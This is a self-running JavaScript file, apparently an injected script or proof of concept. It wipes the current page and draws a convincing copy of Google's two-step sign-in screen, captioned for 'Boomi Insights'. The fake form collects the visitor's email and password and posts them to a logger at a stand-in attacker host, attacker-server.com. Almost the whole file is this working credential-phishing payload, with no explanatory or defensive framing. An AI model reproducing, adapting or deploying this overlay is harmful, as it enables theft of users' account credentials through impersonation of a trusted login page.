(function() {
    'use strict';

    // Function to dynamically load Google's "Roboto" font
    function loadGoogleFonts() {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = 'https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap';
        document.head.appendChild(link);
    }

    // --- Core HTML and CSS for the login box ---
    // CSS is now in a variable to be reused and includes focus styles for inputs
    const baseStyles = `
        <style>
            .container {
                position: fixed; top: 0; left: 0; width: 100%; height: 100%;
                background-color: #fff; display: flex; flex-direction: column;
                align-items: center; justify-content: space-between;
                font-family: 'Roboto', Arial, sans-serif;
            }
            .login-box {
                background: white; padding: 48px 40px; border: 1px solid #ccc;
                border-radius: 8px; width: 368px; text-align: center; margin-top: 100px;
            }
            .login-box img { height: 24px; margin-bottom: 16px; }
            .login-box h1 { font-size: 24px; font-weight: 400; margin: 0 0 8px 0; }
            .login-box p { font-size: 16px; margin-bottom: 24px; }
            .input-field {
                width: 98%; margin-bottom: 10px; padding: 13px 15px; font-size: 16px;
                border-radius: 4px; border: 1px solid #ccc;
            }
            .input-field:focus { border: 2px solid #1a73e8; outline: none; margin-bottom: 9px; }
            .button-container { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; }
            .next-btn {
                background-color: #1a73e8; color: white; border: none; border-radius: 4px;
                padding: 8px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
            }
            .link-btn {
                font-weight: 500; color: #1a73e8; background: none; border: none;
                cursor: pointer; padding: 8px 0; font-size: 14px;
            }
            .footer {
                display: flex; justify-content: space-between; width: 368px;
                padding: 20px 0; font-size: 12px; color: #5f6368;
            }
            .footer-links a { color: #5f6368; text-decoration: none; margin-left: 16px; }
            #show-password-container { text-align: left; margin-top: 10px; font-size: 14px; }
        </style>
    `;

    function showPasswordScreen(email) {
        const passwordHTML = `
            ${baseStyles}
            <div class="container">
                <div class="login-box">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
                    <h1>Welcome</h1>
                    <p style="border: 1px solid #ccc; border-radius: 16px; padding: 4px 12px; display: inline-block;">${email}</p>
                    <form action='https://attacker-server.com/logger.php' method='post'>
                        <input type='hidden' name='username' value='${email}'/>
                        <input type='password' id='g-password' class='input-field' name='password' placeholder='Enter your password' />
                        <div id="show-password-container">
                            <input type="checkbox" id="show-password-cb">
                            <label for="show-password-cb">Show password</label>
                        </div>
                        <div class="button-container" style="justify-content: flex-end;">
                            <button type='submit' class="next-btn">Sign in</button>
                        </div>
                    </form>
                </div>
                <div class="footer">
                    <select><option>English (United States)</option></select>
                    <div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
                </div>
            </div>
        `;
        document.body.innerHTML = passwordHTML;
        // Add functionality to the "Show password" checkbox
        document.getElementById('show-password-cb').addEventListener('change', (e) => {
            document.getElementById('g-password').type = e.target.checked ? 'text' : 'password';
        });
    }

    function showEmailScreen() {
        const emailHTML = `
            ${baseStyles}
            <div class="container">
                <div class="login-box">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google">
                    <h1>Sign in</h1>
                    <p>to continue to Boomi Insights</p>
                    <input type='email' id='g-email' class='input-field' name='username' placeholder='Email or phone' />
                    <div class="button-container">
                        <button type="button" class="link-btn">Forgot email?</button>
                        <button type='button' id="next-btn" class="next-btn">Next</button>
                    </div>
                </div>
                <div class="footer">
                    <select><option>English (United States)</option></select>
                    <div class="footer-links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
                </div>
            </div>
        `;
        document.body.innerHTML = emailHTML;
        document.getElementById('next-btn').addEventListener('click', () => {
            const email = document.getElementById('g-email').value;
            if (email) {
                showPasswordScreen(email);
            }
        });
    }

    // --- Main execution ---
    loadGoogleFonts();
    showEmailScreen();
    document.body.style.margin = '0';
    document.body.style.overflow = 'hidden';

})();
